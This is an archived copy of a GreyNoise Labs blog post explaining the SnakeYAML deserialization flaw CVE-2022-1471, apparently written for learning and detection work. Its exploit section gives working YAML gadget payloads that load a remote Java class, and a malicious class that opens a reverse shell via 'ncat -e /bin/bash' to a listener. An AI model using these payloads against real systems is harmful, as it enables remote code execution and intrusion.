---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-01-03_panic-at-the-yaml.md
original_filename: 2024-01-03_panic-at-the-yaml.md
title: Panic!! At the YAML
category: documents
detected_topics:
- command-injection
- sso
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- sso
- api-security
- supply-chain
language: en
raw_sha256: 62a8453f90930d8a35b28b73fcd5f99d57fdec1135bf1541060f906aa5f4ab11
text_sha256: 6924dfae99ca7cf0676a86c4bad6c316f67bb4a59ca0a2cf724b1801634d8cff
ingested_at: '2026-06-28T07:32:29Z'
sensitivity: unknown
redactions_applied: false
---

# Panic!! At the YAML

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-01-03_panic-at-the-yaml.md
- Source Type: markdown
- Detected Topics: command-injection, sso, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:29Z
- Redactions Applied: False
- Raw SHA256: `62a8453f90930d8a35b28b73fcd5f99d57fdec1135bf1541060f906aa5f4ab11`
- Text SHA256: `6924dfae99ca7cf0676a86c4bad6c316f67bb4a59ca0a2cf724b1801634d8cff`


## Content

---
title: "Panic!! At the YAML"
page_title: "Panic!! At the YAML – GreyNoise Labs"
url: "https://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/"
final_url: "https://www.labs.greynoise.io/grimoire/2024-01-03-snakeyaml-deserialization/"
authors: ["Ron Bowes (@iagox86)"]
programs: ["snakeyaml"]
bugs: ["Insecure deserialization", "RCE"]
publication_date: "2024-01-03"
added_date: "2024-01-10"
source: "pentester.land/writeups.json"
original_index: 583
---

This week, I got nerdsniped by [an advisory from Atlassian](https://confluence.atlassian.com/security/cve-2022-1471-snakeyaml-library-rce-vulnerability-impacts-multiple-products-1296171009.html) that fixes a potential remote code execution vulnerability in the [SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/src/master/) library - CVE-2022-1471. I spent a bit of time looking at Confluence and Bitbucket, which are apparently vulnerable, but couldn’t quickly find a remotely accessible YAML sink; so instead, I decided to learn everything I could about SnakeYAML deserialization issues (CVE-2022-1471), [write a tag](https://viz.greynoise.io/tag/yaml-insecure-deserialization?days=30) to detect any attempts, and share what I’ve learned!

## A story of “insecure by default”

Before we dig into the nuts and bolts of this vulnerability, let me get out my soapbox for a minute. You’re totally free to skip this section if you want to get to the technical stuff; the info below is what got me interested in this issue, though - nothing like a nice dose of open source drama in the morning!

In December of 2022, a bit more than a year ago, somebody [reported a vulnerability](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in) ([archive link](https://web.archive.org/web/20230520172159/https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in)), which would come to be known as CVE-2022-1471, to the SnakeYAML project. The issue: by default, if you parse an untrusted YAML file, the person who created the file can run code on your machine by instantiating an arbitrary Java object and either call its constructor or set its public / settable fields (we’ll look at how that actually works below).

From a lot of Googling and pulling together different sources, I found at least eight different vulnerabilities associated with the insecure default behavior from _before_ that vulnerability was assigned its own CVE:

  * [Oracle Helidon - CVE-2022-21404](https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL)
  * [Spring Tools 4 for Eclipse - CVE-2022-31691](https://spring.io/security/cve-2022-31691)
  * [cwlviewer - CVE-2021-41110](https://github.com/common-workflow-language/cwlviewer/security/advisories/GHSA-7g7j-f5g3-fqp7)
  * [OneDev - CVE-2021-21249](https://github.com/theonedev/onedev/security/advisories/GHSA-7xhq-m2q9-6hpm)
  * [Apache ShardingSphere - CVE-2020-1947](https://lists.apache.org/thread/rzbz4yxpcrzxpwwjzf23ywydkb16t8dh)
  * [Apache Brooklyn - CVE-2016-8744](https://brooklyn.apache.org/community/security/CVE-2016-8744.html)
  * [JBoss RESTEasy - CVE-2016-9606](https://access.redhat.com/security/cve/cve-2016-9606)
  * [Apache Camel - CVE-2017-3159](https://camel.apache.org/security/CVE-2017-3159.html)

There are at least two major advisories from _after_ the behavior was assigned its own CVE - CVE-2022-1471:

  * [PyTorch](https://github.com/pytorch/serve/security/advisories/GHSA-4mqg-h5jf-j9m7)
  * [Various Atlassian products](https://confluence.atlassian.com/security/cve-2022-1471-snakeyaml-library-rce-vulnerability-impacts-multiple-products-1296171009.html)

[Secure by default](https://www.cisa.gov/securebydesign) is obviously a huge part of secure design. A developer shouldn’t be given a cannon pointed at their foot with no safety; instead, they should have to load and aim the cannon themselves (is there a better metaphor than foot-cannons these days? Foot-cannons feel kinda old fashioned). Anyway, this list of vulnerabilities is a great demonstration of why secure-by-default is important - you give people a safe-looking unsafe function that does unsafe things, they’re gonna use it unsafely.

If you’re wondering how the developer responded....... well, [give the issue a read](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in). I know open source is open source, and the developers don’t owe the community anything, but it’s a great education in how _not_ to respond to security reports. Some highlights:

Calling it a non-problem:

> _**Won’t fix**_ means that there is no problem.

Making huge assumptions on how users use YAML:

> It only affects those who take untrusted data from unknown source - no one has presented a valid use case so far.

Indicating that YAML.... is designed to run code...?

> It only concludes that a YAML may execute code. This is **intentional** \- this is why people use YAML (otherwise they may use JSON)

Blaming the tools:

> It is only a problem for those who trust low quality tooling and their false positives.

Blaming developers for using the library incorrectly:

> But when the YAML comes from untrusted source it should be sanitized before it is given to the parser.

Blaming the tools some more:

> Can we try to find a solution which makes this low quality tooling to shut up ? They create false positives far too often

Telling a security researcher that they don’t understand but that they aren’t going to say why:

> Dear `Jonathan`, thank you. I see now how much must be explained. You miss a lot of context and I do not want to reply here.

And so, so much more. It’s a what-not-to-do on handling security issues.

SnakeYAML has [a wiki page](https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE%20&%20NIST.md), that says “[i]f you are dealing with the YAML files received from  _untrusted_ sources - check those Vulnerabilities and assess the risks”, whatever that means. It also says “It is unsafe to open a socket and blindly forward any trash as input for the parser” - kinda funny that a parser suggests that you shouldn’t use it for parsing. That’s like telling people not to click links in software designed for clicking links (ie, a browser).

Despite all that, the [project page](https://bitbucket.org/snakeyaml/snakeyaml/src/master/) says “[w]hen you use SnakeYAML to configure your application you are totally safe”. You know, unless you use it to parse YAML.

Eventually, the SnakeYAML developers rolled out version 2.0 [which is no longer vulnerable](https://bitbucket.org/snakeyaml/snakeyaml/wiki/Changes) to these issues. If you run into any versions of SnakeYAML prior to 2.0, however, carefully check where the data comes from - you might be able to instantiate an arbitrary class!

But we aren’t here to gawk at open source drama, we’re here to talk about vulnerabilities!

## Building a vulnerable application

I wrote a **[proof of concept repository](https://github.com/iagox86/snakeyaml-poc)** , which is basically a minimum viable vulnerable application with an exploit that works in that very limited case. The app basically just parses a YAML file.

Let’s start by looking at the vulnerable application. I actually grabbed [this demo](https://github.com/falconkei/snakeyaml_cve_poc) and stripped away 95% of the code - instead of a web application, mine just reads a local file.

Here is my vulnerable application, which we’ll call `App.java` (sorry it’s so verbose; it’s Java):
  
  
  import org.yaml.snakeyaml.DumperOptions;
  import org.yaml.snakeyaml.constructor.Constructor;
  import org.yaml.snakeyaml.Yaml;
  
  import java.io.FileInputStream;
  import java.io.InputStream;
  
  class MySerialClass {
  private long id;
  public Object objectField;
  public String stringField;
  
  public MySerialClass() {
  }
  
  public MySerialClass(long id, Object test) {
  this.id = id;
  this.objectField = test;
  this.stringField = test.toString();
  }
  
  public String toString() {
  return id + " " + stringField.toString();
  }
  }
  
  public class App {
  public static void main(String[] args) throws Exception {
  MySerialClass data = null;
  
  if(args.length == 0) {
  data = new MySerialClass(1337, "Hello!");
  } else {
  InputStream inputStream = new FileInputStream(args[0]);
  Yaml yaml = new Yaml(new Constructor(MySerialClass.class));
  data = yaml.load(inputStream);
  }
  System.out.println("As string:");
  System.out.println(data);
  
  DumperOptions options = new DumperOptions();
  options.setIndent(2);
  options.setPrettyFlow(true);
  options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
  Yaml yaml = new Yaml(options);
  
  System.out.println();
  System.out.println("As YAML:");
  System.out.println(yaml.dump(data));
  }
  }__

You’ll also need a `.jar` for a vulnerable version of SnakeYAML (I used [`snakeyaml-1.32.jar`](https://mvnrepository.com/artifact/org.yaml/snakeyaml/1.32)), which you can also find in the repo above.

Once you have the `.java` file and the SnakeYAML `.jar` file, you can compile with `javac` (or you can use the `.class` file I committed to the repo):
  
  
  $ javac -cp snakeyaml-1.32.jar App.java
  $__

Once it’s compiled, you can execute it with `java`:
  
  
  $ java -cp .:snakeyaml-1.32.jar App
  As string:
  1337 Hello!
  
  As YAML:
  !!MySerialClass
  objectField: Hello!
  stringField: Hello!__

That YAML file at the end is where the fun’s going to start!

## Understanding !!fields

So let’s make a YAML file containing just the YAML object from above (this is also in the repo, under `demo/legit.yaml`):
  
  
  !!MySerialClass
  objectField: Hello!
  stringField: Hello!__

And load that into our PoC application:
  
  
  $ java -cp .:snakeyaml-1.32.jar App demo/legit.yaml
  As string:
  0 Hello!
  
  As YAML:
  !!MySerialClass
  objectField: Hello!
  stringField: Hello!__

We’ll see that it loads the object just fine.

What’s significant here is the `!!` syntax, which is listed in the [YAML spec](https://yaml.org/spec/1.2.2/) as a “Secondary Handle”. YAML has some [built-in types](https://yaml.org/refcard.html) (like `!!str` and `!!map` and such), but libraries often use them for other things, like defining class names.

We can actually use this to instantiate random built-in classes, such as `java.lang.Byte` (to pick a simple one):
  
  
  $ cat demo/test.yaml
  !!MySerialClass
  stringField: Hello!
  objectField: !!java.lang.Byte ["12"]
  
  $ java -cp .:snakeyaml-1.32.jar App demo/test.yaml
  As string:
  0 Hello!
  
  As YAML:
  !!MySerialClass
  objectField: 12
  stringField: Hello!__

If you try to create a `Byte` object with a string or array, you’ll see that it’s just calling the constructor for the type:
  
  
  $ cat demo/test.yaml
  !!MySerialClass
  stringField: Hello!
  objectField: !!java.lang.Byte ["hello"]
  
  $ java -cp .:snakeyaml-1.32.jar App demo/test.yaml
  Exception in thread "main" Cannot create property=objectField for JavaBean=0 Hello!
  
  [...]
  
  Caused by: java.lang.NumberFormatException: For input string: "hello"
  at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
  at java.base/java.lang.Integer.parseInt(Integer.java:668)
  at java.base/java.lang.Byte.parseByte(Byte.java:193)
  at java.base/java.lang.Byte.<init>(Byte.java:372)
  ... 20 more __
  
  
  $ cat demo/test.yaml
  !!MySerialClass
  stringField: Hello!
  objectField: !!java.lang.Byte [12, 34]
  
  $ java -cp .:snakeyaml-1.32.jar App demo/test.yaml
  Exception in thread "main" Cannot create property=objectField for JavaBean=0 Hello!
  
  [...]
  
  
  Caused by: org.yaml.snakeyaml.error.YAMLException: No suitable constructor with 2 arguments found for class java.lang.Byte
  at org.yaml.snakeyaml.constructor.Constructor$ConstructSequence.construct(Constructor.java:594)
  at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:325)
  ... 13 more __

This is enough to somewhat understand how these objects are instantiated. But what’s that mean for exploits?

## Writing an exploit

We certainly aren’t the first to write about this; for one thing, there’s a [Metasploit module for PyTorch](https://github.com/rapid7/metasploit-framework/pull/18427) that implements this exact attack vector, though it’s a bit tricky to understand. There’s [a demo](https://github.com/artsploit/yaml-payload) from Michael Stepankin (artsploit) that will open the MacOS calculator app, which is cool, but not really my favorite way to demo a bug. It also doesn’t really explain the attack. There’s a [nice Medium post](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) that explains it better, but their code can’t be copied/pasted (the indents / quotes are broken), and a lot of the info is in screenshots. This section is going to be a combination of all those resources, simplified as much as I can. :)

If there are other resources out there, I’d love to hear about them! I found kind of a lack of explanations on how this exploit works, just a bunch of exploits saying “just do this”.

### Building the YAML file

Most of the write-ups tell you to just create the object you want, like:
  
  
  $ cat demo/test.yaml
  !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://localhost:8000/"] ]] ]__

And then load it into YAML; which, with the test app I wrote, didn’t initially work:
  
  
  $ java -cp .:snakeyaml-1.32.jar App demo/test.yaml
  Exception in thread "main" Can't construct a java object for tag:yaml.org,2002:MySerialClass; exception=No suitable constructor with 1 arguments found for class MySerialClass
  in 'reader', line 1, column 1:
  !!javax.script.ScriptEngineManag ... 
  ^
  
  at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:331)
  at org.yaml.snakeyaml.constructor.BaseConstructor.constructObjectNoCheck(BaseConstructor.java:235)
  at org.yaml.snakeyaml.constructor.BaseConstructor.constructObject(BaseConstructor.java:224)
  at org.yaml.snakeyaml.constructor.BaseConstructor.constructDocument(BaseConstructor.java:178)
  at org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:162)
  at org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:477)
  at org.yaml.snakeyaml.Yaml.load(Yaml.java:418)
  at App.main(App.java:36)
  Caused by: org.yaml.snakeyaml.error.YAMLException: No suitable constructor with 1 arguments found for class MySerialClass
  at org.yaml.snakeyaml.constructor.Constructor$ConstructSequence.construct(Constructor.java:594)
  at org.yaml.snakeyaml.constructor.Constructor$ConstructYamlObject.construct(Constructor.java:325)
  ... 7 more __

I had to spend a bit of time messing with the parser to figure out what it’s actually looking for. It turns out, like so many things, is that the answer is “it depends”. Let’s look at some examples; I’ll explain the actual object later, for now just assume it’s “bad news” to instantiate it. :)

If the expected object had a zero-argument constructor, you can [use a YAML dictionary](https://github.com/iagox86/snakeyaml-poc/blob/main/demo/exploit-dictionary.yaml) to create an object that sets one or more public fields to the object you want:
  
  
  !!MySerialClass
  stringField: "hi"
  objectField: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://localhost:8000/"]]]]__

If there is a one-argument constructor, you can [send the raw object](https://github.com/iagox86/snakeyaml-poc/blob/main/demo/exploit-raw-object.yaml), but from what I can tell it doesn’t actually run the constructor, and therefore doesn’t actually run the exploit, so I’d avoid using this one:
  
  
  !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://localhost:8000/"] ]] ]__

If there is a constructor with one or more arguments, you can pass an [array of that many objects](https://github.com/iagox86/snakeyaml-poc/blob/main/demo/exploit-array.yaml), each of which will be instantiated. This one is used for a constructor that takes two arguments, but you can use any number (and the object types don’t seem to matter):
  
  
  !!MySerialClass [
  !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://localhost:8000/"] ]] ],
  "Hello!"
  ]__

### Serving the file

We’ve been using this gadget without really explaining it:
  
  
  !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://localhost:8000/"] ]] ],__

That’s the gadget I see most commonly in write-ups, but it’s certainly not the only one! The nice thing is, it works in the default JVM without any special libraries, which means it should work against most targets.

Looking at the gadget, we can take a pretty good guess that it’s going to fetch something from `http://localhost:8000` (obviously, that can be any URL). I tried simply serving a `.jar` file, but that didn’t work. So, what exactly is it doing?

When in doubt, set up a `ncat` listener to see what’s going on; after the target parses that YAML file, this request arrives:
  
  
  $ nc -l -p 8000
  HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1
  User-Agent: Java/17.0.9
  Host: localhost:8000
  Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
  Connection: keep-alive __

It’s a HEAD request for `/META-INF/services/javax.script.ScriptEngineFactory`. What’s that?

I’m sure if we read the documentation on how the `ScriptEngineFactory` class works, we could figure it out. Or we can take apart the Metasploit module and see what _it’s_ doing, then just do that. :)

The `/META-INF/services/javax.script.ScriptEngineFactory` simply returns a string that’s used as a class name. We can use a Python `http.server` listener to serve [a fake webroot](https://github.com/iagox86/snakeyaml-poc/tree/main/webroot-print) containing that file, and put an arbitrary class name into that file:
  
  
  $ find .
  .
  ./META-INF
  ./META-INF/services
  ./META-INF/services/javax.script.ScriptEngineFactory
  
  $ cat ./META-INF/services/javax.script.ScriptEngineFactory
  MyTestClass
  
  $ python -m http.server
  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  
  [... run the PoC ...]
  
  127.0.0.1 - - [19/Dec/2023 15:46:18] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 15:46:18] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 15:46:18] code 404, message File not found
  127.0.0.1 - - [19/Dec/2023 15:46:18] "GET /MyTestClass.class HTTP/1.1" 404 -__

So we return `MyTestClass` from the `./META-INF/services/javax.script.ScriptEngineFactory` file, and it then tries to fetch `/MyTestClass.class`. That’s promising! It turns out, I (kinda) know how to write a Java class, so let’s write one!

But, I don’t know how to write a Java class _that_ well, so I just put some code into a constructor:
  
  
  $ cat MyTestClass.java 
  public class MyTestClass {
  public MyTestClass() {
  System.out.println("Hi!");
  }
  }
  
  $ javac MyTestClass.java 
  
  $ python -m http.server
  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  
  [... run the PoC ...]
  
  127.0.0.1 - - [19/Dec/2023 15:51:22] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 15:51:22] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 15:51:22] "GET /MyTestClass.class HTTP/1.1" 200 -__

In the PoC, we can see.. well, an error:
  
  
  $ java -cp .:snakeyaml-1.32.jar App demo/exploit.yaml
  ScriptEngineManager providers.next(): javax.script.ScriptEngineFactory: MyTestClass not a subtype
  As string:
  0 Hello!
  [...]__

D’oh! We need our class to be a subtype of `javax.script.ScriptEngineFactory`. Surely I’m not going to have to....... _gasp_ learn Java? Or, worse....... install..... Eclipse? Surely there’s a better way!

Thankfully, [Swapneil Kumar Dash to the rescue](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)! Their blog provides source code, albeit in a format that’s not super easy to copy/paste. But, I copied it, pasted it, changed the ellipses glyphs to three periods (as Torvalds intended!!), fixed the indenting, removed unnecessary newlines, and got it to compile. You can grab [the finished version here](https://github.com/iagox86/snakeyaml-poc/blob/main/webroot-print/MyTestClass.java), but here’s an early version:
  
  
  $ cat MyTestClass.java 
  import javax.script.ScriptEngine;
  import javax.script.ScriptEngineFactory;
  import java.io.File;
  import java.util.List;
  
  public class MyTestClass implements ScriptEngineFactory {
  public MyTestClass() {
  System.out.println("It's working!!");
  System.exit(0);
  }
  
  @Override public String getEngineName() { return null; }
  @Override public String getEngineVersion() { return null; }
  @Override public List<String> getExtensions() { return null; }
  @Override public List<String> getMimeTypes() { return null; }
  @Override public List<String> getNames() { return null; }
  @Override public String getLanguageName() { return null; }
  @Override public String getLanguageVersion() { return null; }
  @Override public Object getParameter(String key) { return null; }
  @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
  @Override public String getOutputStatement(String toDisplay) { return null; }
  @Override public String getProgram(String... statements) { return null; }
  @Override public ScriptEngine getScriptEngine() { return null; }
  }
  
  $ javac MyTestClass.java
  
  $ python -m http.server
  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  
  [... run the PoC ...]
  
  127.0.0.1 - - [19/Dec/2023 15:58:27] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 15:58:27] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 15:58:27] "GET /MyTestClass.class HTTP/1.1" 200 -__

And, in the window where we ran our PoC:
  
  
  $ java -cp .:snakeyaml-1.32.jar App demo/exploit.yaml
  It's working!!__

Wouldya look at that? We ran some code!

### Ligggght weaponization

Since we’re just serving up a `.class` file, we can run whatever Java code you like at this point. The simplest one would be to [`exec` another command](https://github.com/iagox86/snakeyaml-poc/blob/main/webroot-exec/MyTestClass.java):
  
  
  $ cat MyTestClass.java 
  import javax.script.ScriptEngine;
  import javax.script.ScriptEngineFactory;
  import java.io.File;
  import java.io.IOException;
  import java.util.List;
  
  public class MyTestClass implements ScriptEngineFactory {
  public MyTestClass() throws Exception {
  Runtime.getRuntime().exec("ncat -e /bin/bash 10.0.0.32 4444");
  System.exit(0);
  }
  
  @Override public String getEngineName() { return null; }
  @Override public String getEngineVersion() { return null; }
  @Override public List<String> getExtensions() { return null; }
  @Override public List<String> getMimeTypes() { return null; }
  @Override public List<String> getNames() { return null; }
  @Override public String getLanguageName() { return null; }
  @Override public String getLanguageVersion() { return null; }
  @Override public Object getParameter(String key) { return null; }
  @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
  @Override public String getOutputStatement(String toDisplay) { return null; }
  @Override public String getProgram(String... statements) { return null; }
  @Override public ScriptEngine getScriptEngine() { return null; }
  }
  
  $ javac MyTestClass.java 
  
  $ python -m http.server
  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  
  [... run the PoC ...]
  
  127.0.0.1 - - [19/Dec/2023 16:02:54] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 16:02:54] "GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 200 -
  127.0.0.1 - - [19/Dec/2023 16:02:54] "GET /MyTestClass.class HTTP/1.1" 200 -__

And in our `ncat` listener:
  
  
  $ nc -l -p 4444
  
  pwd
  /home/ron/shared/analysis/snakeyaml/snakeyaml_cve_poc
  
  whoami
  ron __

And thus, we have a remote shell! We can also use a Meterpreter payload or really whatever you want.

## Conclusion

Secure by default is super important.

Hopefully this helps y’all understand how to test YAML applications!

## References

Core vulnerability:

  * [SnakeYAML advisory](https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in)
  * [SnakeYAML changelog](https://bitbucket.org/snakeyaml/snakeyaml/wiki/Changes)
  * [SnakeYAML sourcecode](https://bitbucket.org/snakeyaml/snakeyaml/src/master/)
  * [SnakeYAML security](https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE%20&%20NIST.md)
  * [SnakeYAML vulnerable version download](https://mvnrepository.com/artifact/org.yaml/snakeyaml/1.32)
  * [YAML spec](https://yaml.org/spec/1.2.2/)
  * [YAML quick reference](https://yaml.org/refcard.html)
  * [PyTorch exploit](https://github.com/rapid7/metasploit-framework/pull/18427)
  * [My demo PoC](https://github.com/iagox86/snakeyaml-poc)
  * [Bhanu’s demo PoC](https://github.com/falconkei/snakeyaml_cve_poc)
  * [Artsploit demo](https://github.com/artsploit/yaml-payload)
  * [Swapneil Kumar Dash write-up](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)

Advisories associated with the vulnerability:

  * [Various Atlassian products - CVE-2022-1471](https://confluence.atlassian.com/security/cve-2022-1471-snakeyaml-library-rce-vulnerability-impacts-multiple-products-1296171009.html)
  * [PyTorch - CVE-2023-43654](https://github.com/pytorch/serve/security/advisories/GHSA-4mqg-h5jf-j9m7)
  * [Oracle Helidon - CVE-2022-21404](https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL)
  * [Spring Tools 4 for Eclipse - CVE-2022-31691](https://spring.io/security/cve-2022-31691)
  * [cwlviewer - CVE-2021-41110](https://github.com/common-workflow-language/cwlviewer/security/advisories/GHSA-7g7j-f5g3-fqp7)
  * [OneDev - CVE-2021-21249](https://github.com/theonedev/onedev/security/advisories/GHSA-7xhq-m2q9-6hpm)
  * [Apache ShardingSphere - CVE-2020-1947](https://lists.apache.org/thread/rzbz4yxpcrzxpwwjzf23ywydkb16t8dh)
  * [Apache Brooklyn - CVE-2016-8744](https://brooklyn.apache.org/community/security/CVE-2016-8744.html)
  * [JBoss RESTEasy - CVE-2016-9606](https://access.redhat.com/security/cve/cve-2016-9606)
  * [Apache Camel - CVE-2017-3159](https://camel.apache.org/security/CVE-2017-3159.html)
